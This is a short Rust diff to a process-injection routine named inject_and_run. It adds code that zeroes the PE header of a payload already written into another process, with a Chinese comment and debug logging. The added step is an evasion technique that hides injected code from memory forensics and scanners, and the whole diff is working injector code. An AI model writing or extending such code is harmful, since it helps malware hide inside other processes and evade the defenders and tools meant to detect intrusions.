@@ -515,6 +515,23 @@ pub unsafe fn inject_and_run(
         return;
     }
 
+    // 將 remote_image_base 的 PE header 清除
+    let zeros = vec![0u8; 0x1000];
+    let mut bytes_written: usize = 0;
+    unsafe {
+        WriteProcessMemory(
+            process_handle,
+            remote_image_base,
+            zeros.as_ptr() as *const std::ffi::c_void,
+            zeros.len(),
+            &mut bytes_written,
+        );
+    }
+    debug!(
+        "Successfully cleared PE header! Bytes written: 0x{:x}",
+        bytes_written
+    );
+
     debug!(
         "Successfully created remote thread! Thread Handle: 0x{:x}",
         thread_handle as usize
